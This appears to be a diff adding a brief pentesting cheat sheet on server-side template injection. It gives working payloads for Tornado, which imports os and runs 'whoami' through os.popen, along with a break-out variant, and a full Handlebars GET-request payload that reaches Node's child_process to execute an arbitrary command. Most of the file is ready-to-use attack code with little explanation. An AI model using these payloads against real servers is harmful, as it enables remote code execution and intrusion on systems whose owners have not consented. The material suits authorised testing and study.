@@ -1,0 +1,31 @@
+GENERAL
+> keep original value to prevent errors
+> always understand back-end syntax 
+
+TORNADO
+> {% import os %}{{ os.popen("whoami").read() }}
+> attack: original.value}}{% import os %}{{ os.popen("whoami").read()
+
+HANDLEBARS
+> Enter {{}} and check for errors
+> Payload:
+
+GET /?message={{%23with+"s"+as+|string|}}
+++{{%23with+"e"}}
+++++{{%23with+split+as+|conslist|}}
+++++++{{this.pop}}
+++++++{{this.push+(lookup+string.sub+"constructor")}}
+++++++{{this.pop}}
+++++++{{%23with+string.split+as+|codelist|}}
+++++++++{{this.pop}}
+++++++++{{this.push+"process+=+require('child_process');return+process.exec('INSERTCOMMANDHERE')"}}
+++++++++{{this.pop}}
+++++++++{{%23each+conslist}}
+++++++++++{{%23with+(string.sub.apply+0+codelist)}}
+++++++++++++{{this}}
+++++++++++{{/with}}
+++++++++{{/each}}
+++++++{{/with}}
+++++{{/with}}
+++{{/with}}
+{{/with}}
